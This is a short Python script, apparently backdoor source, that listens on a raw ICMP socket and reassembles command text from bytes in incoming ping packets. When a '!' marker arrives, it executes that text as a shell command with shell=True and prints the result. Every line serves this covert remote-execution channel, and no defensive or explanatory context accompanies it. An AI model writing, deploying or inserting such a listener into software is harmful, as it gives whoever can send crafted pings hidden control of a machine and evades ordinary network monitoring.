import socket
import struct
import subprocess

# Create a raw socket to receive ICMP packets
icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
icmp_socket.bind(('0.0.0.0', 0))

# Continuously listen for ICMP Echo Requests and execute the received command
while True:
    command = b''
    while True:
        # Receive an ICMP packet and extract the data payload
        packet, addr = icmp_socket.recvfrom(1024)
        if packet[24:25] == '!'.encode('utf-8'):
            break
        command += packet[24:28]
    
    # Execute the received command and get the output
    command = command.decode().strip('\x00')
    print(command)
    try:
        output = subprocess.check_output(command, shell=True)
        print(output.decode("latin-1"))
    except:
        continue